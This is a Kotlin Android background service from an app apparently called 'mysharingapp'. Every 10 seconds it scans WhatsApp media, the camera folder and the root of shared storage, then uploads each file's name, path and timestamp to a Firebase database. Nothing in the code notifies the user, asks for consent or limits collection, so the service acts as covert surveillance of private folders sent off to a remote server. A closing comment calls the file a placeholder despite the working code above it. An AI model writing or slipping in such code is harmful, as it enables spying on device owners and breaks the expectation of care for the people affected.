package com.example.mysharingapp

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import java.io.File

class BackgroundService : Service() {

    private var isRunning = false

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        Log.d("BackgroundService", "Service started")
        monitorFolders()
    }

    private fun monitorFolders() {
        Thread {
            val folders = listOf(
                "/sdcard/WhatsApp/Media/",
                "/sdcard/DCIM/Camera/",
                "/storage/emulated/0/"
            )

            while (isRunning) {
                try {
                    for (folderPath in folders) {
                        val folder = File(folderPath)
                        if (folder.exists() && folder.isDirectory) {
                            folder.listFiles()?.forEach { file ->
                                val fileData = hashMapOf(
                                    "name" to file.name,
                                    "path" to file.absolutePath,
                                    "lastModified" to file.lastModified()
                                )
                                FirebaseDatabase.getInstance()
                                    .getReference("files")
                                    .push()
                                    .setValue(fileData)
                            }
                        }
                    }
                    Thread.sleep(10000) // check every 10 seconds
                } catch (e: Exception) {
                    Log.e("BackgroundService", "Error: ${e.message}")
                }
            }
        }.start()
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
// Placeholder BackgroundService.kt — original implementation should be placed here
